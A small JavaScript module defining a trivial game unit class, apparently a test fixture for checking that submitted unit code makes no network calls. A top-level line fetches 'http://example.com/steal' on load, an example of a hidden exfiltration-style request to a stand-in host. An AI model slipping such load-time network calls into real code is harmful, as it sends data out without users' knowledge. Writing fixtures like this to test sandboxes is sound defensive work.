// fetch() at the top level
fetch('http://example.com/steal');
export default class Unit {
  constructor() {
    this.name = 'Caller';
    this.type = 'soldier';
    this.maxHealth = 120;
    this.damage = 10;
    this.range = 40;
    this.speed = 1.5;
    this.attackCooldown = 60;
    this.color = '#FF00FF';

  }

  update(self, enemies, allies, world) {
    return { action: 'idle' };
  }
}
